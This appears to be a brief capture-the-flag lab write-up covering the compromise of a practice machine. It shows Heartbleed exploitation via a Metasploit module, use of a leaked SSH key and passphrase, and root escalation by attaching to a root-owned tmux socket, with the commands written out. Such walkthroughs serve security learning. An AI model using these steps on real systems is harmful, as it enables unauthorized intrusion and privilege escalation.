From initial nmap scan,
port 80 <- check the website
22 ssh
443 <- https => site has SSL/TLS implemented

nmap --script vuln scans shows this server might be vulnerable for sslheartbleed.
Likely based on the machine name and the homepage.

metaploits has an exploit for this.
auxiliary/scanner/ssl/openssl_heartbleed

dump the memory leak
-> suspicious b64 string found -> decoded to -> heartbleedbelievethehype
from the exposed directories found from gobuster -> dev/hype_key
decoded from hex -> ssh private key
chmod 600 hype_key then ssh in the session: ssh -i hype_key hype@10.10.10.79
passphrase for the private key: heartbleedbelievethehype
user.txt is located in /home/hype/Desktop
user pwned!

-----------------------------------------------------------------------------------

upload linpeas.sh to the server.
Running linpeas.sh -> possible attack vectors: old kernel version, tmux session being run as root
ps aux shows /usr/bin/tmux -S /.devs/dev_sess being run as root.
Let's try it:
/usr/bin/tmux -S /.devs/dev_sess -> root session gained
root.txt is located in /root
root pwned!
